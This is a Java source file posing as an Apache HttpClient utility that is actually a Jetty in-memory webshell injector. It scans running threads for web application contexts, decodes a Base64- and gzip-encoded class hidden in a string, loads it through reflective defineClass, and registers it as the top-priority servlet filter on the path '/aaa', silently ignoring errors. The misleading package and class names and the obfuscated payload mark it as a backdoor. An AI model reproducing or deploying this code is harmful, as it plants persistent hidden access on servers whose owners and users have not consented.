package org.apache.http.client.hf;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.zip.GZIPInputStream;

public class SerializationUtil {
    public String getClassName() {
        return "org.apache.logging.WhiteBlackListBblFilter";
    }

    public String getUrlPattern() {
        return "/aaa";
    }

    public String getBase64String() throws IOException {
        return "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";
    }

    public SerializationUtil() throws Exception {
        List<Object> contexts = this.getContext();
        Iterator var2 = contexts.iterator();

        while(var2.hasNext()) {
            Object context = var2.next();
            Object filter = this.getFilter(context);
            this.addFilter(context, filter);
        }

    }

    public void addFilter(Object context, Object magicFilter) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, UnsupportedEncodingException {
        String urlPattern = this.getUrlPattern();
        Class filterClass = magicFilter.getClass();

        try {
            Object servletHandler = getFV(context, "_servletHandler");
            if (isInjected(servletHandler, filterClass.getName())) {
                return;
            }

            invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{Class.class, String.class, Integer.TYPE}, new Object[]{filterClass, urlPattern, 1});
            Object filterMaps = getFV(servletHandler, "_filterMappings");
            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];
            int n = 1;

            int j;
            for(j = 0; j < Array.getLength(filterMaps); ++j) {
                Object filter = Array.get(filterMaps, j);
                String filterName = (String)getFV(filter, "_filterName");
                if (filterName.contains(filterClass.getName())) {
                    tmpFilterMaps[0] = filter;
                } else {
                    tmpFilterMaps[n] = filter;
                    ++n;
                }
            }

            for(j = 0; j < tmpFilterMaps.length; ++j) {
                Array.set(filterMaps, j, tmpFilterMaps[j]);
            }
        } catch (Exception var12) {
        }

    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        Thread[] var3 = threads;
        int var4 = threads.length;

        for(int var5 = 0; var5 < var4; ++var5) {
            Thread thread = var3[var5];

            try {
                Object contextClassLoader = this.getContextClassLoader(thread);
                if (this.isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(this.getContextFromWebAppClassLoader(contextClassLoader));
                } else if (this.isHttpConnection(thread)) {
                    contexts.add(this.getContextFromHttpConnection(thread));
                }
            } catch (Exception var8) {
            }
        }

        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFV(classLoader, "_context");
        Object handler = getFV(context, "_servletHandler");
        return getFV(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");

        for(int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }

        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");

        for(int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFV(servletContext, "this$0");
                }
            }
        }

        throw new Exception("HttpConnection not found");
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName()).newInstance();
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Exception var8) {
                var8.printStackTrace();
            }
        }

        return filter;
    }

    public static boolean isInjected(Object servletHandler, String filterClassName) throws Exception {
        try {
            Object filterMaps = getFV(servletHandler, "_filterMappings");

            for(int i = 0; i < Array.getLength(filterMaps); ++i) {
                Object filter = Array.get(filterMaps, i);
                String filterName = (String)getFV(filter, "_filterName");
                if (filterName.contains(filterClassName)) {
                    return true;
                }
            }

            return false;
        } catch (Exception var6) {
            return false;
        }
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }
}
